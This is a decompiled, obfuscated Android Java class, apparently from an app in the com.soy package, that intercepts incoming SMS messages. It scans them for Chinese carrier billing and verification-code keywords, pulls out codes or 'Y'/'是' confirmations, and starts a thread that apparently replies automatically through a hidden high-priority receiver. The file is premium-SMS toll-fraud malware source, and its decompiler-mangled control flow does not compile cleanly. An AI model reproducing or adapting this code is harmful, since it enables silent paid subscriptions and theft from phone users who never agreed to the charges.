package com.soy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import java.util.Collection;
import java.util.HashMap;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class q
  extends BroadcastReceiver
{
  public static HashMap a;
  private static t b;
  private static int d = 1;
  private static String e = null;
  private static final String f;
  private boolean c;
  private BroadcastReceiver g = new r(this);
  
  static
  {
    a = new HashMap();
    int[] arrayOfInt = new int[24];
    arrayOfInt[0] = 18;
    arrayOfInt[1] = 14;
    arrayOfInt[2] = 15;
    arrayOfInt[4] = 24;
    arrayOfInt[5] = 56;
    arrayOfInt[6] = 17;
    arrayOfInt[7] = 4;
    arrayOfInt[8] = 56;
    arrayOfInt[9] = 18;
    arrayOfInt[10] = 4;
    arrayOfInt[11] = 13;
    arrayOfInt[12] = 19;
    arrayOfInt[13] = 56;
    arrayOfInt[14] = 18;
    arrayOfInt[15] = 12;
    arrayOfInt[16] = 18;
    arrayOfInt[17] = 56;
    arrayOfInt[19] = 2;
    arrayOfInt[20] = 19;
    arrayOfInt[21] = 8;
    arrayOfInt[22] = 14;
    arrayOfInt[23] = 13;
    f = ab.a(arrayOfInt);
  }
  
  public q() {}
  
  private static void a(String paramString)
  {
    if (TextUtils.isEmpty(paramString)) {
      break label7;
    }
    label7:
    while ((!a.a("验证码", paramString)) || (a.a("退订", paramString))) {
      return;
    }
    paramString = Pattern.compile("[0-9]{3,30}").matcher(paramString);
    for (;;)
    {
      if (!paramString.find())
      {
        if (TextUtils.isEmpty(e)) {
          break;
        }
        d = 3;
        return;
      }
      if ((!paramString.group().matches("[0]+")) && (!paramString.group().startsWith("10086")) && (!paramString.group().startsWith("10010")) && (!paramString.group().startsWith("10000"))) {
        e = paramString.group();
      }
    }
  }
  
  public final void onReceive(Context paramContext, Intent paramIntent)
  {
    Object localObject2;
    int i;
    Object localObject1;
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      d = 1;
      e = null;
      paramIntent = paramIntent.getExtras();
      if (paramIntent != null)
      {
        paramIntent = (Object[])paramIntent.get("pdus");
        if ((paramIntent != null) && (paramIntent.length > 0))
        {
          localObject2 = new SmsMessage[paramIntent.length];
          i = 0;
          if (i < paramIntent.length) {
            break label249;
          }
          localObject1 = new StringBuffer();
          paramIntent = "";
          int j = localObject2.length;
          i = 0;
          label82:
          if (i < j) {
            break label269;
          }
          if ((!TextUtils.isEmpty(paramIntent)) && (!TextUtils.isEmpty((CharSequence)localObject1)))
          {
            if (!paramIntent.startsWith("+86")) {
              break label783;
            }
            paramIntent = paramIntent.substring(3);
          }
        }
      }
    }
    label180:
    label209:
    label249:
    label269:
    label296:
    label408:
    label771:
    label778:
    label781:
    label783:
    for (;;)
    {
      localObject2 = ((StringBuffer)localObject1).toString();
      localObject1 = new t();
      b = (t)localObject1;
      ((t)localObject1).f = paramIntent;
      b.h = ((String)localObject2);
      if (a.b(paramIntent))
      {
        if (!TextUtils.isEmpty((CharSequence)localObject2))
        {
          if (!TextUtils.isEmpty((CharSequence)localObject2)) {
            break label296;
          }
          localObject1 = "";
          if (!a.a("(查询或退订|抱歉|成功购买|成功定制|成功订购|订购成功|开始生效)", (String)localObject1))
          {
            if (!a.a("(回复任意|回复其他|回复Y|\\bY\\b)", (String)localObject1)) {
              break label408;
            }
            d = 2;
            e = "Y";
          }
        }
        if ((d <= 1) || (TextUtils.isEmpty(e))) {
          break label771;
        }
        localObject1 = y.d.values().iterator();
      }
      for (;;)
      {
        if (!((Iterator)localObject1).hasNext())
        {
          return;
          localObject2[i] = SmsMessage.createFromPdu((byte[])paramIntent[i]);
          i += 1;
          break;
          paramIntent = localObject2[i];
          ((StringBuffer)localObject1).append(paramIntent.getMessageBody());
          paramIntent = paramIntent.getOriginatingAddress();
          i += 1;
          break label82;
          localObject1 = ((String)localObject2).replaceAll("^\\s+", "").replaceAll("^1", "").replaceAll("\\d+\\.(\\d+)?", "").replaceAll("[0-9]{1,4}(小时|角|时|次|元|个|年|月|日|点|分|秒|金币|[\\s]?MB)", "").replaceAll("序号[A-Za-z0-9]+", "").replaceAll("\\d{4}-\\d{1,2}-\\d{1,2}\\s?(\\d{1,2}:\\d{1,2}(:\\d{1,2})?)?", "").replaceAll("(http://|https://)?([a-zA-Z0-9_]+)*(\\.com|\\.cn|\\.net)([\\/\\.a-zA-Z0-9]+)?", "").replaceAll("1[3458]{1}\\d{9}", "").replaceAll("1[3458][0-9\\*]{4}\\d{4}", "").replaceAll("400-([0-9]){1}([0-9-]{7})", "").replaceAll("400[016789]\\d{6}(-[0-9])?", "").replaceAll("0\\d{2,3}-\\d{5,9}|0\\d{2,3}-\\d{5,9}", "").replaceAll("\\(0?[1-9]\\/0?[1-9]\\)", "").replaceAll("[0-9][∶:：][0-9]", "").replaceAll("[1-9][.、%]", "");
          break label180;
          if (a.a("\\b是\\b", (String)localObject1))
          {
            d = 2;
            e = "是";
            break label209;
          }
          if (a.a("\\by\\b", (String)localObject1))
          {
            d = 2;
            e = "y";
            break label209;
          }
          a((String)localObject1);
          break label209;
        }
        Object localObject3 = (t)((Iterator)localObject1).next();
        if (((t)localObject3).c != 1)
        {
          if ((!TextUtils.isEmpty(((t)localObject3).f)) && (paramIntent.equals(((t)localObject3).f))) {
            i = 1;
          }
          for (;;)
          {
            if (i == 0) {
              break label781;
            }
            if (!TextUtils.isEmpty(((t)localObject3).k))
            {
              String str = e;
              localObject3 = ((t)localObject3).l;
              a.a();
              break;
              if ((TextUtils.isEmpty(((t)localObject3).g)) || (!a.a("(" + ((t)localObject3).g + ")", (String)localObject2))) {
                break label778;
              }
              i = 1;
              continue;
            }
            if (d != ((t)localObject3).c) {
              break;
            }
            b.c = d;
            b.i = paramIntent;
            if (!TextUtils.isEmpty(((t)localObject3).j)) {
              e = String.format(((t)localObject3).j, new Object[] { e });
            }
            b.j = e;
            if (!TextUtils.isEmpty(((t)localObject3).i)) {
              b.i = ((t)localObject3).i;
            }
            if (!this.c)
            {
              this.c = true;
              localObject3 = new IntentFilter();
              ((IntentFilter)localObject3).addAction(f);
              ((IntentFilter)localObject3).setPriority(Integer.MAX_VALUE);
              paramContext.registerReceiver(this.g, (IntentFilter)localObject3);
            }
            localObject3 = b;
            if ((TextUtils.isEmpty(((t)localObject3).i)) || (TextUtils.isEmpty(((t)localObject3).j))) {
              break;
            }
            new s((t)localObject3, paramContext).start();
            break;
            a.a(b);
            return;
            i = 0;
          }
        }
      }
    }
  }
}
